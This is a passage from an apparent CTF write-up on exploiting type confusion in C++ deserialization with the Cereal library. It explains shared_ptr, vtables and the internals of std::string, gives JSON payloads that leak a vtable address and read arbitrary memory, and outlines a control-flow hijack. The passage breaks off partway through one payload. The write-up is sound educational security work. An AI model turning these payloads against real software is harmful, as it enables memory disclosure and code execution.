<span class="token output">Remind me of the data again? </span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h2 id="c-internals-redux" tabindex="-1"><a class="md-anchor" href="#c-internals-redux" aria-hidden="true"></a> C++ Internals Redux</h2><p>To better understand the program and how the exploitation works, let's review some C++!</p><p>If you're familiar, you may want to skip ahead to <a href="#analysis">the analysis</a>.</p><h3 id="what-are-shared-pointers" tabindex="-1"><a class="md-anchor" href="#what-are-shared-pointers" aria-hidden="true"></a> What are shared pointers?</h3><p>Shared pointers (<code>std::shared_ptr</code>) are smart pointers in C++ that enable <strong>multiple pointers</strong> to manage the lifetime of a <strong>single object</strong>. They use&nbsp;<strong>reference counting</strong>&nbsp;to track how many&nbsp;shared pointers point to the same dynamically allocated resource. The object is automatically deleted when the last remaining&nbsp;<code>shared_ptr</code>&nbsp;pointing to it is destroyed or reset. This provides automatic memory management while allowing shared ownership.</p><div class="alert alert-success d-flex align-items-start"><i class="fas fa-lightbulb ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>Key Point for Exploitation: Multiple shared pointers may share a single object. This often complicates serialization, and may lead to bugs if improperly implemented.</p></div></div><p>Example:</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;memory&gt;</span></span>

<span class="token keyword">class</span> <span class="token class-name">Resource</span> <span class="token punctuation">{</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    <span class="token function">Resource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Resource acquired\n"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token operator">~</span><span class="token function">Resource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Resource destroyed\n"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">void</span> <span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Resource used\n"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// Create a shared_ptr that manages a new Resource</span>
    std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Resource<span class="token operator">&gt;</span> ptr1 <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_shared</span><span class="token generic class-name"><span class="token operator">&lt;</span>Resource<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token punctuation">{</span>
        <span class="token comment">// Create another shared_ptr that shares ownership</span>
        std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Resource<span class="token operator">&gt;</span> ptr2 <span class="token operator">=</span> ptr1<span class="token punctuation">;</span>
        
        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Inside inner scope - "</span><span class="token punctuation">;</span>
        ptr2<span class="token operator">-&gt;</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Both pointers can use the resource</span>
        
        <span class="token comment">// ptr2 will be destroyed here, but resource remains</span>
    <span class="token punctuation">}</span>
    
    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Outside inner scope - "</span><span class="token punctuation">;</span>
    ptr1<span class="token operator">-&gt;</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ptr1 still keeps the resource alive</span>
    
    <span class="token comment">// ptr1 destroyed here → reference count reaches 0 → resource destroyed</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Output:</p><div class="code-toolbar"><pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">Resource acquired
Inside inner scope - Resource used
Outside inner scope - Resource used
Resource destroyed</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h3 id="what-are-virtual-tables" tabindex="-1"><a class="md-anchor" href="#what-are-virtual-tables" aria-hidden="true"></a> What are virtual tables?</h3><p>A&nbsp;<strong>vtable</strong>&nbsp;(virtual table) is the mechanism that enables runtime polymorphism in C++.</p><ul><li><p>Each virtual class (any class containing virtual functions) has <strong>one</strong> corresponding virtual table (vtable).</p><p><a class="lightbox-single" title="Example of how virtual classes, vtables, and overriding virtual functions is implemented. Credit: Pablo Arias" href="/img/vpointer-674w.webp"><img class="mb-2 rw center jw-100 alpha-img" src="/img/vpointer-674w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 674 / 376" alt="Example of how virtual classes, vtables, and overriding virtual functions is implemented. Credit: Pablo Arias" title="Example of how virtual classes, vtables, and overriding virtual functions is implemented. Credit: Pablo Arias" srcset="/img/vpointer-256w.webp 256w, /img/vpointer-512w.webp 512w, /img/vpointer-674w.webp 674w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 674px"></a></p><p class="caption"><sup>Example of how virtual classes, vtables, and overriding virtual functions is implemented. Credit: Pablo Arias</sup></p><p class="no-center"></p></li><li><p>The vtable stores an <strong>array of virtual functions</strong>.</p></li><li><p>Each <strong>object</strong> of a virtual class <strong>holds a virtual pointer</strong> (vpointer) which points to the vtable they are instantiated with. The vpointer is a “hidden first member” and precedes other members.</p></li><li><p>When a virtual function is called, dynamic dispatch is carried out by looking up the vtable then jumping to a function at a hard-coded offset. In assembly, this could be seen as a double dereference.</p><div class="code-toolbar"><pre class="language-asm" tabindex="0"><code class="language-asm"><span class="token comment">; precondition: rax contains the address of the object</span>
mov    rdx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span> <span class="token comment">; first dereference (get VTable)</span>
mov    rdx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment">; second dereference (get function inside VTable)</span>
call   rdx                 <span class="token comment">; call the function</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Assembly</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li></ul><p>For further reading, I recommend checking out: <a href="https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/" rel="noreferrer" target="_blank">Understanding Virtual Tables in C++ by Pablo Arias</a> and <a href="https://stackoverflow.com/a/99341/10239789" rel="noreferrer" target="_blank">this StackOverflow Q&amp;A</a>.</p><div class="alert alert-success d-flex align-items-start"><i class="fas fa-lightbulb ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>Key Points for Exploitation: 1) If an attacker controls the vpointer, they can hijack control flow. 2) The vpointer is the first member of any object of a virtual class.</p></div></div><h3 id="what-is-an-std-string" tabindex="-1"><a class="md-anchor" href="#what-is-an-std-string" aria-hidden="true"></a> What is an <code>std::string</code>?</h3><p>We all know what a string is in programming, but what does C++'s <code>std::string</code> look like?</p><p>If we dig into the source code, we see the (GCC) implementation is roughly equivalent to:</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">CharT</span><span class="token operator">&gt;</span>
<span class="token keyword">struct</span> <span class="token class-name">basic_string</span> <span class="token punctuation">{</span>
    CharT<span class="token operator">*</span> buffer<span class="token punctuation">;</span>
  	size_t size<span class="token punctuation">;</span> <span class="token comment">// size_t == uint64_t on 64-bit systems.</span>
    size_t capacity<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">using</span> string <span class="token operator">=</span> basic_string<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">&gt;</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Ignoring short-string optimisation and other factors, an <code>std::string</code> simply consists of three members: the buffer (a pointer to the actual characters), the size, and the capacity of the dynamically allocated memory.</p><p>This allows for a growable string, suitable for dynamic operations such as append, replace, and remove.</p><div class="alert alert-success d-flex align-items-start"><i class="fas fa-lightbulb ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>Key Point for Exploitation: If we control <code>buffer</code> and can observe the string, we can achieve arbitrary memory read.</p></div></div><h2 id="analysis" tabindex="-1"><a class="md-anchor" href="#analysis" aria-hidden="true"></a> Analysis</h2><h3 id="initial-analysis" tabindex="-1"><a class="md-anchor" href="#initial-analysis" aria-hidden="true"></a> Initial Analysis</h3><p>First step: Understanding what we have, aka enumeration. What protections are in place? What attack primitives are available?</p><p>Protections are typically easy to check. Running <code>checksec</code>, we see <strong>NX</strong> is enabled, which means shellcode is out of the question. <strong>PIE</strong> and, by default, <strong>ASLR</strong> are also enabled, so we'll want some kind of address leak to do anything useful.</p><p><a class="lightbox-single" title="Checksec shows most binary protections are enabled." href="/img/posts/infosec/cpp-deserialization/assets/breakfast_checksec-758w.webp"><img class="mb-2 rw center jw-60" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_checksec-758w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 758 / 376" alt="Checksec shows most binary protections are enabled." title="Checksec shows most binary protections are enabled." srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_checksec-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_checksec-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_checksec-758w.webp 758w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 758px"></a></p><p>Looking at the code, we see 3 classes deserialized.</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Congee</span>
<span class="token punctuation">{</span>
    <span class="token keyword">uint64_t</span> ingredients<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">Toast</span>
<span class="token punctuation">{</span>
    <span class="token keyword">uint64_t</span> spread<span class="token punctuation">;</span>
    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">Fruit</span>
<span class="token punctuation">{</span>
    std<span class="token double-colon punctuation">::</span>string name<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// ...</span>

std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Remind me of the data again? "</span><span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>string input<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span><span class="token function">getline</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>cin<span class="token punctuation">,</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Read input</span>

std<span class="token double-colon punctuation">::</span>stringstream <span class="token function">ss</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
cereal<span class="token double-colon punctuation">::</span>JSONInputArchive <span class="token function">archive</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">;</span>

std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Congee<span class="token operator">&gt;</span> c<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Toast<span class="token operator">&gt;</span> t<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>shared_ptr<span class="token operator">&lt;</span>Fruit<span class="token operator">&gt;</span> f<span class="token punctuation">;</span>
<span class="token function">archive</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> t<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Deserialization happens here!</span>
std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\nc: "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>c <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"t: "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>t <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f: "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>f <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
t<span class="token operator">-&gt;</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Cereal supports serialization of <code>std::shared_ptr</code>. But how are shared references handled?</p><p>Cereal's JSON format uses an <code>id</code> key for shared pointers. If <code>id</code> is greater than <code>2 &lt;&lt; 30</code> (2147483648), then the object is new and memory should be allocated for it. Otherwise, the object was seen before and the old <code>std::shared_ptr</code> should be copied.</p><p>For instance, here's a sample JSON cereal-isation containing shared references:</p><div class="code-toolbar"><pre class="language-json" tabindex="0"><code class="language-json"><span class="token punctuation">[</span>
	<span class="token punctuation">{</span><span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2147483649</span><span class="token punctuation">,</span> <span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"..."</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token punctuation">{</span><span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2147483650</span><span class="token punctuation">,</span> <span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"..."</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token punctuation">{</span><span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token punctuation">{</span><span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span> <span class="token punctuation">}</span>
<span class="token punctuation">]</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">JSON</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>In the above code example, 2147483649 and 2147483650 refer to new objects with ID 1 and 2. Memory is dynamically allocated, and object data is deserialized. Afterwards, the deserializer encounters <code>"id": 1</code> which refers to the first object. No new data is deserialized, and the first <code>std::shared_ptr</code> is copied.</p><p>We've figured out how Cereal handles shared references, but how can we apply it to the challenge?</p><p>Well, what if we <em>force</em> a shared reference, even if the deserialized types are <em>different</em>?</p><h3 id="type-confusion-primitives" tabindex="-1"><a class="md-anchor" href="#type-confusion-primitives" aria-hidden="true"></a> Type Confusion Primitives</h3><p>It turns out Cereal does not perform type checking on shared pointers. If the deserialization handles multiple types, we can abuse it for type confusion!</p><p>I'll share a deep-dive into the type confusion primitives in a future post. For now, it suffices to understand <em>what</em> primitives are available in this challenge and <em>how</em> to achieve those primitives.</p><p>Here are the types again, for reference:</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Congee</span> <span class="token punctuation">{</span>
    <span class="token keyword">uint64_t</span> ingredients<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">Toast</span> <span class="token punctuation">{</span>
    <span class="token comment">// uint64_t vptr; // &lt;-- implicit vpointer member due to the virtual function</span>
    <span class="token keyword">uint64_t</span> spread<span class="token punctuation">;</span>
    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">Fruit</span> <span class="token punctuation">{</span>
    std<span class="token double-colon punctuation">::</span>string name<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>And the primitives available:</p><div class="table-container"><table><thead><tr><th>If we deserialize a...</th><th>followed by a...</th><th>we get...</th><th>because we...</th></tr></thead><tbody><tr><td>Toast</td><td>Fruit</td><td>Address Leak (ASLR Bypass)</td><td>leak the vtable</td></tr><tr><td>Congee</td><td>Fruit</td><td>Arbitrary Memory Read</td><td>control string internals</td></tr><tr><td>Congee</td><td>Toast</td><td>Control Flow Hijacking</td><td>control the vpointer</td></tr></tbody></table></div><p>If the table doesn't make sense, perhaps this diagram demonstrating an address leak will help:</p><p><a class="lightbox-single" title="Diagram of Type Confusion on Toast and Fruit." href="/img/posts/infosec/cpp-deserialization/assets/breakfast_type_confusion-1008w.webp"><img class="mb-2 rw center jw-80 alpha-imgv" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_type_confusion-1008w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1008 / 461" alt="Diagram of Type Confusion on Toast and Fruit." title="Diagram of Type Confusion on Toast and Fruit." srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_type_confusion-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_type_confusion-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_type_confusion-1008w.webp 1008w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 1008px"></a></p><p>The program thinks the memory at <code>0x4000</code> is a <code>Fruit</code>, but surprise!— it's actually a <code>Toast</code>. When <code>Fruit::name</code> is printed, what's actually printed is the vtable entry of <code>Toast</code>.</p><p>Together, these primitives are enough to obtain arbitrary code execution!</p><h2 id="exploitation" tabindex="-1"><a class="md-anchor" href="#exploitation" aria-hidden="true"></a> Exploitation</h2><p>Great, we've found the chink in the armor. Now let's draft a plan of attack.</p><ol><li>Leak the VTable address. (<code>Toast</code> → <code>Fruit</code>) We can use this to calculate the base address of the binary and offsets to other locations (e.g. <abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Global Offset Table">GOT</abbr> entries). This will be useful to bypass ASLR/PIE.</li><li>Leak a libc/libcpp address. (<code>Congee</code> → <code>Fruit</code>) This allows us to calculate offsets to gadgets.</li><li>Find a heap address. (<code>Congee</code> → <code>Fruit</code>) We'll need this address for the next step.</li><li>Hijack control flow to point to a crafted gadget chain. (<code>Congee</code> → <code>Toast</code>) We'll use the 64 bytes available in <code>Congee</code> to plant a fake vtable containing a gadget chain. When the virtual function is called, the chain is triggered.</li></ol><h3 id="leaking-the-vtable" tabindex="-1"><a class="md-anchor" href="#leaking-the-vtable" aria-hidden="true"></a> Leaking the VTable</h3><p>Leaking the vtable is rather straightforward. We simply set the <code>id</code> of the <code>Fruit</code> object to refer to the <code>Toast</code> object. But wait— since <code>Fruit</code> is a string, we should make sure the size is non-zero. Luckily, we can control the size using the <code>spread</code> parameter.</p><p>To recap, by type-confusing <code>Fruit</code> and controlling <code>spread</code>, we map <code>Toast</code>'s vpointer to <code>Fruit</code>'s string buffer and <code>Toast</code>'s <code>spread</code> parameter to <code>Fruit</code>'s string size.</p><div class="code-toolbar"><pre data-label="vtable_leak_json" class="language-json" tabindex="0"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"value0"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// Congee (unused this time)</span>
        <span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2147483649</span><span class="token punctuation">,</span> <span class="token comment">// id = 1</span>
            <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"ingredients"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token comment">// ...</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"value1"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// Toast</span>
        <span class="token property">"polymorphic_id"</span><span class="token operator">:</span> <span class="token number">1073741824</span><span class="token punctuation">,</span>
        <span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2147483650</span><span class="token punctuation">,</span> <span class="token comment">// id = 2</span>
            <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"spread"</span><span class="token operator">:</span> <span class="token number">8</span> <span class="token comment">// Control the size of the fake string</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"value2"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// Fruit</span>
        <span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span> <span class="token comment">// Refer to the Toast object</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>vtable_leak_json</span></div><div class="toolbar-item"><span class="lang">JSON</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>When deserialized, <code>t</code> and <code>f</code> share the same object. When <code>*f</code> is printed, it will dereference the string buffer (vpointer) and print the first entry of the vtable, which is <code>Toast::eat</code>.</p><div class="code-toolbar"><pre class="line-numbers language-cpp" data-start="76" tabindex="0" style="counter-reset: linenumber 75;"><code class="language-cpp"><span class="token function">archive</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> t<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Deserialization happens here</span>
std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\nc: "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>c <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"t: "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>t <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f: "</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>f <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token comment">// Vtable address leaked</span></code><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>We can do a quick PoC with <code>xxd</code>, which allows us to view nonprintable bytes. By changing the initial JSON's <code>value1.ptr_wrapper.data.spread</code> and <code>value2.ptr_wrapper.id</code> fields, we can induce the binary to spit out 8 weird bytes, which happen to be an address leak of <code>0x560864bd50c2</code>! (Hint: It's in little endian, so read the leaked number backwards.)</p><p><a class="lightbox-single" title="By controlling spread and Fruit's id, we were able to leak 8 bytes of the vtable entry." href="/img/posts/infosec/cpp-deserialization/assets/breakfast_test_with_xxd-1360w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_test_with_xxd-1360w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1360 / 1098" alt="By controlling spread and Fruit's id, we were able to leak 8 bytes of the vtable entry." title="By controlling spread and Fruit's id, we were able to leak 8 bytes of the vtable entry." srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_test_with_xxd-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_test_with_xxd-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_test_with_xxd-1024w.webp 1024w, /img/posts/infosec/cpp-deserialization/assets/breakfast_test_with_xxd-1360w.webp 1360w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1360px"></a></p><div class="alert alert-info d-flex align-items-start"><i class="fas fa-bolt ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p><strong>Going Deeper</strong></p><p>The PoC was successful. But what if things didn’t go as planned? To debug at a lower level, we can open gdb/gef/pwndbg and break after the deserialization step.</p><p><a class="lightbox-single" title="Notice that we successfully type-confused t and f as they share the same object." href="/img/posts/infosec/cpp-deserialization/assets/breakfast_pwndbg_demo-2754w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/infosec/cpp-deserialization/assets/breakfast_pwndbg_demo-2754w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 2754 / 1328" alt="Notice that we successfully type-confused t and f as they share the same object." title="Notice that we successfully type-confused t and f as they share the same object." srcset="/img/posts/infosec/cpp-deserialization/assets/breakfast_pwndbg_demo-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/breakfast_pwndbg_demo-512w.webp 512w, /img/posts/infosec/cpp-deserialization/assets/breakfast_pwndbg_demo-1024w.webp 1024w, /img/posts/infosec/cpp-deserialization/assets/breakfast_pwndbg_demo-2754w.webp 2754w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 2754px"></a></p><p>By printing <code>t</code> and <code>f</code>, we see that they share the same object.</p></div></div><p>(Note: If an image ever looks too small, try clicking and zooming in on it.)</p><h3 id="arbitrary-memory-read" tabindex="-1"><a class="md-anchor" href="#arbitrary-memory-read" aria-hidden="true"></a> Arbitrary Memory Read!</h3><p>Now that we have an address from the binary, we can continue on our warpath by leaking a libc address. We’ll use the <code>Congee</code> → <code>Fruit</code> primitive which allows control over the properties of an <code>std::string</code> and grants us arbitrary memory read!</p><div class="code-toolbar"><pre data-label="mem_read_json" class="language-json" tabindex="0"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"value0"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token comment">// Congee</span>
        <span class="token property">"ptr_wrapper"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2147483649</span><span class="token punctuation">,</span> <span class="token comment">// id = 1</span>
            <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token property">"ingredients"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token property">"value0"</span><span class="token operator">:</span> %d<span class="token punctuation">,</span> <span class="token comment">// Control the string buffer</span>
                    <span class="token property">"value1"</span><span class="token operator">:</span> %d<span class="token punctuation">,</span> <span class="token comment">// Control the string size</span>
                    <span class="token property">"value2"</span><span class="token operator">:</span> %d<span class="token punctuation">,</span> <span class="token comment">// Control the string capacity (optional)</span>
                    <span class="token property">"value3"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
                    <span class="token property">"value4"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
                    <span class="token property">"value5"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
                    <span class="token property">"value6"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
